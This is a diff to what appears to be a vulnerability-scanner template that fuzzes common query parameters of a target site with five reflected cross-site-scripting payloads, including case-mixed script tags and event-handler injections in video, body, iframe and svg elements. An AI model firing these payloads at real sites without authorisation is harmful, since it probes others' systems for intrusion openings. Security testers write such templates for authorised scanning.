@@ -1,17 +1,36 @@
 id: THENAWABX_FOUND_XSS
 info:
-  name: ⚡ Nawab-Confirmed-XSS ⚡
+  name: Nawab-Confirmed-XSS
   author: thenawabx
   severity: high
 
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}?q=<video><source/onerror=confirm(1)>"
-      - "{{BaseURL}}?id=<body/onpageshow=alert?.(1)>"
-      - "{{BaseURL}}?search=<iframe/srcdoc=\"<svg/onload=confirm(1)>\">"
-      - "{{BaseURL}}?name=<script>alert(\"Hacked\")</script>"
-      - "{{BaseURL}}?msg=<ScRipt>alert(\"Hacked\")</ScRipt>"
+  - pre-condition:
+      - expr: "queue.has_params"
+
+    payloads:
+      xss_payloads:
+        - "<video><source/onerror=confirm(1)>"
+        - "<body/onpageshow=alert?.(1)>"
+        - "<iframe/srcdoc=\"<svg/onload=confirm(1)>\">"
+        - "<script>alert(\"Hacked\")</script>"
+        - "<ScRipt>alert(\"Hacked\")</ScRipt>"
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: multiple
+        keys:
+          - "q"
+          - "id"
+          - "search"
+          - "name"
+          - "msg"
+          - "query"
+          - "keyword"
+          - "text"
+        fuzz:
+          - "{{xss_payloads}}"
 
     stop-at-first-match: true
     matchers-condition: and
@@ -43,6 +62,9 @@ http:
           - "tutorial"
           - "W3Schools"
           - "placeholder"
+          - "how to"
+          - "learning"
+        condition: or
 
     extractors:
       - type: regex
